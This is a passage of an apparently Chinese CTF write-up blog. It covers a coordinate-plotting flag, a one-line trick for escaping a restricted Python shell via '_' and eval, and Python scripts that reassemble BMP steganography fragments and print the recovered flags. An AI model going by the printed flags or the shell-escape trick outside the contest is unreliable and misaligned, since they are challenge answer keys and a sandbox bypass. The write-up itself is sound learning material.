class="hljs-number">25</span>, <span class="hljs-number">25</span>, <span class="hljs-number">25</span>, <span class="hljs-number">25</span>, <span class="hljs-number">25</span>, <span class="hljs-number">25</span>, <span class="hljs-number">25</span>, <span class="hljs-number">26</span>, <span class="hljs-number">26</span>, <span class="hljs-number">26</span>, <span class="hljs-number">26</span>, <span class="hljs-number">26</span>, <span class="hljs-number">26</span>, <span class="hljs-number">26</span>, <span class="hljs-number">26</span>, <span class="hljs-number">26</span>, <span class="hljs-number">26</span>, <span class="hljs-number">27</span>, <span class="hljs-number">27</span>, <span class="hljs-number">27</span>, <span class="hljs-number">27</span>, <span class="hljs-number">27</span>, <span class="hljs-number">27</span>, <span class="hljs-number">27</span>, <span class="hljs-number">27</span>, <span class="hljs-number">27</span>, <span class="hljs-number">27</span>, <span class="hljs-number">27</span>, <span class="hljs-number">28</span>, <span class="hljs-number">28</span>, <span class="hljs-number">28</span>, <span class="hljs-number">28</span>, <span class="hljs-number">28</span>, <span class="hljs-number">28</span>, <span class="hljs-number">28</span>, <span class="hljs-number">28</span>, <span class="hljs-number">28</span>, <span class="hljs-number">28</span>, <span class="hljs-number">28</span>, <span class="hljs-number">28</span>, <span class="hljs-number">28</span>, <span class="hljs-number">29</span>, <span class="hljs-number">29</span>, <span class="hljs-number">29</span>, <span class="hljs-number">29</span>, <span class="hljs-number">29</span>, <span class="hljs-number">31</span>, <span class="hljs-number">31</span>, <span class="hljs-number">31</span>, <span class="hljs-number">31</span>, <span class="hljs-number">31</span>, <span class="hljs-number">31</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">33</span>, <span class="hljs-number">33</span>, <span class="hljs-number">33</span>, <span class="hljs-number">33</span>, <span class="hljs-number">33</span>, <span class="hljs-number">33</span>, <span class="hljs-number">33</span>, <span class="hljs-number">33</span>, <span class="hljs-number">33</span>, <span class="hljs-number">33</span>, <span class="hljs-number">33</span>, <span class="hljs-number">34</span>, <span class="hljs-number">34</span>, <span class="hljs-number">34</span>, <span class="hljs-number">34</span>, <span class="hljs-number">34</span>, <span class="hljs-number">34</span>, <span class="hljs-number">34</span>, <span class="hljs-number">34</span>, <span class="hljs-number">34</span>, <span class="hljs-number">35</span>, <span class="hljs-number">35</span>, <span class="hljs-number">35</span>, <span class="hljs-number">35</span>, <span class="hljs-number">35</span>, <span class="hljs-number">35</span>, <span class="hljs-number">35</span>, <span class="hljs-number">35</span>, <span class="hljs-number">35</span>, <span class="hljs-number">35</span>, <span class="hljs-number">35</span>, <span class="hljs-number">36</span>, <span class="hljs-number">36</span>, <span class="hljs-number">36</span>, <span class="hljs-number">36</span>, <span class="hljs-number">36</span>, <span class="hljs-number">36</span>, <span class="hljs-number">36</span>, <span class="hljs-number">37</span>, <span class="hljs-number">37</span>, <span class="hljs-number">37</span>, <span class="hljs-number">37</span>, <span class="hljs-number">37</span>, <span class="hljs-number">37</span>, <span class="hljs-number">37</span>, <span class="hljs-number">37</span>, <span class="hljs-number">37</span>, <span class="hljs-number">38</span>, <span class="hljs-number">38</span>, <span class="hljs-number">38</span>, <span class="hljs-number">38</span>, <span class="hljs-number">38</span>, <span class="hljs-number">38</span>, <span class="hljs-number">38</span>, <span class="hljs-number">38</span>, <span class="hljs-number">38</span>, <span class="hljs-number">38</span>, <span class="hljs-number">38</span>, <span class="hljs-number">38</span>, <span class="hljs-number">38</span>, <span class="hljs-number">38</span>, <span class="hljs-number">38</span>, <span class="hljs-number">38</span>, <span class="hljs-number">38</span>, <span class="hljs-number">39</span>, <span class="hljs-number">39</span>, <span class="hljs-number">39</span>]<br>    k = [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">30</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">29</span>, <span class="hljs-number">30</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">10</span>, <span class="hljs-number">16</span>, <span class="hljs-number">17</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">29</span>, <span class="hljs-number">30</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">16</span>, <span class="hljs-number">18</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">29</span>, <span class="hljs-number">30</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">17</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">25</span>, <span class="hljs-number">28</span>, <span class="hljs-number">29</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">16</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">25</span>, <span class="hljs-number">29</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">13</span>, <span class="hljs-number">15</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">29</span>, <span class="hljs-number">30</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">15</span>, <span class="hljs-number">16</span>, <span class="hljs-number">17</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">20</span>, <span class="hljs-number">25</span>, <span class="hljs-number">29</span>, <span class="hljs-number">30</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">30</span>, <span class="hljs-number">31</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">16</span>, <span class="hljs-number">17</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>, <span class="hljs-number">12</span>, <span class="hljs-number">19</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">12</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">12</span>, <span class="hljs-number">17</span>, <span class="hljs-number">18</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">12</span>, <span class="hljs-number">16</span>, <span class="hljs-number">17</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">9</span>, <span class="hljs-number">12</span>, <span class="hljs-number">16</span>, <span class="hljs-number">25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">16</span>, <span class="hljs-number">17</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">17</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">16</span>, <span class="hljs-number">17</span>, <span class="hljs-number">19</span>, <span class="hljs-number">20</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">16</span>, <span class="hljs-number">19</span>, <span class="hljs-number">20</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">16</span>, <span class="hljs-number">19</span>, <span class="hljs-number">20</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">12</span>, <span class="hljs-number">13</span>, <span class="hljs-number">16</span>, <span class="hljs-number">19</span>, <span class="hljs-number">20</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">12</span>, <span class="hljs-number">13</span>, <span class="hljs-number">16</span>, <span class="hljs-number">19</span>, <span class="hljs-number">20</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">16</span>, <span class="hljs-number">17</span>, <span class="hljs-number">19</span>, <span class="hljs-number">20</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">17</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">13</span>, <span class="hljs-number">25</span>, <span class="hljs-number">31</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">13</span>, <span class="hljs-number">17</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">26</span>, <span class="hljs-number">32</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">12</span>, <span class="hljs-number">16</span>, <span class="hljs-number">17</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">26</span>, <span class="hljs-number">32</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">11</span>, <span class="hljs-number">16</span>, <span class="hljs-number">17</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">26</span>, <span class="hljs-number">32</span>, <span class="hljs-number">6</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">17</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">26</span>, <span class="hljs-number">33</span>, <span class="hljs-number">5</span>, <span class="hljs-number">12</span>, <span class="hljs-number">13</span>, <span class="hljs-number">19</span>, <span class="hljs-number">20</span>, <span class="hljs-number">26</span>, <span class="hljs-number">32</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">13</span>, <span class="hljs-number">16</span>, <span class="hljs-number">19</span>, <span class="hljs-number">20</span>, <span class="hljs-number">25</span>, <span class="hljs-number">26</span>, <span class="hljs-number">32</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">13</span>, <span class="hljs-number">16</span>, <span class="hljs-number">17</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">31</span>, <span class="hljs-number">32</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">31</span>]<br><br>    <span class="hljs-comment"># 绘制点</span><br>    plt.scatter(a, k)<br><br>    <span class="hljs-comment"># 显示图表</span><br>    plt.show()<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230527165736757.png" alt="image-20230527165736757"></p><p>flag{202305012359}</p><h1 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell"></a>pyshell</h1><p>思想就是python交互的时候_是默认储存最后一个打印的值，就可以充当临时的字符串储存，最后再用eval执行。</p><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230528164922250.png" alt="image-20230528164922250"></p><h1 id="拼图"><a href="#拼图" class="headerlink" title="拼图"></a>拼图</h1><p>看了师傅的wp后续复现了一点，主要还是对bmp的字段不熟悉，最近也要考试了就先复现到这吧</p><h3 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h3><p>这里的话是用两个字段去隐藏了坐标信息</p><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230529184803157.png" alt="image-20230529184803157"></p><p>reserved1和2分别是x轴和y轴，同时拼好之后发现上面一部分有一行一行倒过来的，具体控制的是这个字段</p><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230529185052805.png" alt="image-20230529185052805"></p><p>那么思想就是，将图按照坐标一块一块拼接起来，同时还要检查块是否倒置</p><p>用下面的脚本，内有测试用的python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> numpy<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long,long_to_bytes<br><br>folder_path = <span class="hljs-string">&quot;H:/py_test/ciss/tmp4&quot;</span>  <span class="hljs-comment"># 将 /path/to/folder 替换为实际的文件夹路径</span><br><br><span class="hljs-comment"># 获取文件夹中的所有文件名，并将其转换为数字进行排序（排除不是数字的文件名）</span><br>file_names = os.listdir(folder_path)<br>file_names_sorted = []<br>x=[]<br>y=[]<br>bfReserved1 = []<br>bfReserved2 = []<br>bmp = &#123;&#125;<br><br><br>bmp_l = <span class="hljs-number">0</span> <span class="hljs-comment">#宽7110</span><br>bmp_h = <span class="hljs-number">0</span> <span class="hljs-comment">#高3900</span><br><br>result_image = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (<span class="hljs-number">7200</span>, <span class="hljs-number">4000</span>)) <span class="hljs-comment"># 在大多数情况下，坐标系的原点通常位于画布的左上角。</span><br><br><span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> file_names:<br><br>        file_names_sorted.append(name)<br>        <span class="hljs-comment"># print(i)</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;../tmp4/<span class="hljs-subst">&#123;name&#125;</span>&#x27;</span>, <span class="hljs-string">&#x27;rb+&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.seek(<span class="hljs-number">6</span>)<br>            byte_data1 = f.read(<span class="hljs-number">2</span>)<br>            f.seek(<span class="hljs-number">8</span>)  <span class="hljs-comment"># 将文件指针移动到第8个字节的位置</span><br>            byte_data2 = f.read(<span class="hljs-number">2</span>)  <span class="hljs-comment"># 读取两个字节</span><br>            f.seek(<span class="hljs-number">22</span>)<br>            byte_data3 = f.read(<span class="hljs-number">4</span>) <span class="hljs-comment"># 判断是否上下颠倒</span><br>            value1 = <span class="hljs-built_in">int</span>.from_bytes(byte_data1, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>,signed=<span class="hljs-literal">True</span>)  <span class="hljs-comment"># 将二进制数据转换为整数 x坐标</span><br>            value2 = <span class="hljs-built_in">int</span>.from_bytes(byte_data2, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>,signed=<span class="hljs-literal">True</span>)  <span class="hljs-comment"># y坐标</span><br>            value3 = <span class="hljs-built_in">int</span>.from_bytes(byte_data3, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>,signed=<span class="hljs-literal">True</span>)<br>            value4 = <span class="hljs-built_in">int</span>.from_bytes(byte_data3, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)<br>            x.append(value1)<br>            y.append(value2)<br>            bmp.update(&#123;name:(value1,value2)&#125;)<br>            <span class="hljs-keyword">if</span> value3 &lt; <span class="hljs-number">0</span> :<br>                value3 = <span class="hljs-number">0</span> - value3<br>                packed_data = struct.pack(<span class="hljs-string">&#x27;&lt;i&#x27;</span>, value3)<br>                f.seek(<span class="hljs-number">22</span>)<br>                f.write(packed_data)<br>                <span class="hljs-built_in">print</span>(packed_data)<br><br>        img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;../tmp4/<span class="hljs-subst">&#123;name&#125;</span>&#x27;</span>)<br>        result_image.paste(im=img, box=(value1, value2)) <span class="hljs-comment"># </span><br><br>result_image.save(<span class="hljs-string">&#x27;1.bmp&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(bmp)<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/1.bmp" alt="1"></p><p>然后发现lsb隐写</p><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230529185411886.png" alt="image-20230529185411886"></p><p>flag{f1R5T_part_1s_LSB_ sTeG0_</p><h3 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h3><p>然后因为上面是倒置的，这里就放之前没处理过的原图</p><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230529185552824.png" alt="image-20230529185552824"></p><p>就怀疑可能有01的数据量隐藏在里面，那么我们就要考虑一下，倒是这个如何从洒落的碎片获得正确顺序序01的数据流？</p><p>按照左上为原点的坐标，越往上的0越往下越大</p><p>那么把之前的代码捡出来贴一下（没有整理）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long,long_to_bytes<br><span class="hljs-keyword">import</span> libnum<br>folder_path = <span class="hljs-string">&quot;H:/py_test/ciss/tmp4&quot;</span>  <span class="hljs-comment"># 将 /path/to/folder 替换为实际的文件夹路径</span><br><br><span class="hljs-comment"># 获取文件夹中的所有文件名，并将其转换为数字进行排序（排除不是数字的文件名）</span><br>file_names = os.listdir(folder_path)<br>file_names_sorted = []<br>x=[]<br>y=[]<br>bmp = &#123;&#125;<br><br>xor = &#123;&#125;<br><br>bmp_l = <span class="hljs-number">0</span> <span class="hljs-comment">#宽7110</span><br>bmp_h = <span class="hljs-number">0</span> <span class="hljs-comment">#高3900</span><br>y_m = <span class="hljs-number">500</span> <span class="hljs-comment"># 取反最下面的图片，y的位置是500 在大多数情况下，坐标系的原点通常位于画布的左上角。</span><br><br><br><span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> file_names:<br><br>        file_names_sorted.append(name)<br>        <span class="hljs-comment"># print(i)</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;../tmp4/<span class="hljs-subst">&#123;name&#125;</span>&#x27;</span>, <span class="hljs-string">&#x27;rb+&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.seek(<span class="hljs-number">6</span>)<br>            byte_data1 = f.read(<span class="hljs-number">2</span>)<br>            f.seek(<span class="hljs-number">8</span>)  <span class="hljs-comment"># 将文件指针移动到第8个字节的位置</span><br>            byte_data2 = f.read(<span class="hljs-number">2</span>)  <span class="hljs-comment"># 读取两个字节</span><br>            f.seek(<span class="hljs-number">22</span>)<br>            byte_data3 = f.read(<span class="hljs-number">4</span>) <span class="hljs-comment"># 判断是否上下颠倒</span><br>            value1 = <span class="hljs-built_in">int</span>.from_bytes(byte_data1, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>,signed=<span class="hljs-literal">True</span>)  <span class="hljs-comment"># 将二进制数据转换为整数</span><br>            value2 = <span class="hljs-built_in">int</span>.from_bytes(byte_data2, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>,signed=<span class="hljs-literal">True</span>)<br>            value3 = <span class="hljs-built_in">int</span>.from_bytes(byte_data3, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>,signed=<span class="hljs-literal">True</span>)<br>            x.append(value1)<br>            y.append(value2)<br>            bmp.update(&#123;name:(value1,value2)&#125;)<br>            <span class="hljs-comment"># if value3 &lt; 0 :</span><br>            <span class="hljs-comment">#     if value2 &gt; y_m:</span><br>            <span class="hljs-comment">#         y_m = value2 算它到底是在第几行是最后一行的倒置的图片</span><br>            <span class="hljs-keyword">if</span> value2 &lt;= y_m:<br>                <span class="hljs-keyword">if</span> value2 <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> xor.keys():<br>                    xor.update(&#123;value2:[]&#125;)<br>                <span class="hljs-keyword">if</span> value3 &lt; <span class="hljs-number">0</span>:<br>                    xor[value2].append([value1,<span class="hljs-string">&#x27;0&#x27;</span>])<br>                <span class="hljs-keyword">if</span> value3 &gt; <span class="hljs-number">0</span>:<br>                    xor[value2].append([value1,<span class="hljs-string">&#x27;1&#x27;</span>])<br><br>xor2 = <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">sorted</span>(xor.items(), key=<span class="hljs-keyword">lambda</span> items: items[<span class="hljs-number">0</span>]))<br><br>bin_str = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> key, values <span class="hljs-keyword">in</span> xor2.items():<br>    <span class="hljs-built_in">print</span>(key)<br>    values = <span class="hljs-built_in">sorted</span>(values, key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> values:<br>        bin_str += value[-<span class="hljs-number">1</span>]<br><br><span class="hljs-built_in">print</span>(libnum.b2s(bin_str))<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230529185936962.png" alt="image-20230529185936962"></p><p>b’          2nd_paRT_15_reVeRSe_bMp_         .–. .- -..’</p><p>那么获得第二段和提示  pad</p><p>这里pab是色块的填充字段，要布满最小4个字节，但是之前没接触过，emmmm下次再写吧</p><p>flag{f1R5T_part_1s_LSB_ sTeG0_2nd_paRT_15_reVeRSe_bMp_</p><h3 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h3><p>因为提示是pab，就是代表填充的意思，很有意思的是每行的色块（也称为扫描线）的字节数需要按照4字节对齐，在01我们可以看到一行一行的项是储存，假如是32位的BMP图像，每个像素占用4个字节，其中还包括一个8位的Alpha通道，用于表示像素的透明度，那么除以4整除，就不需要填充了，但是如果是24位的话，每个像素点就只有rgb三个通道，一个占一个字节，那么将可能需要进行填充的情况，一般是填充0，但是这些都是无用的，其实我们可以在里面隐藏数据</p><p>怎么判断图像时24位还是32位，在头里有说，在bitcount字段，属性也有</p><p>我现在选取的是第一张17447199634.bmp</p><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230531134145322.png" alt="image-20230531134145322"></p><p>那么确实有藏的可能喽，我们先看一下一行几个像素点</p><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230531134347413.png" alt="image-20230531134347413"></p><p>98个，98x3%4 &#x3D; 2，那么每行将可能藏了两个字节</p><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230531134530345.png" alt="image-20230531134530345"></p><p>其实在01里都看到填充字段喽</p><p>ffd8，狂喜</p><p>但是看了最后一张并没有ffd9，有可能藏的图片咩有那么长，啧，不管了先提一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 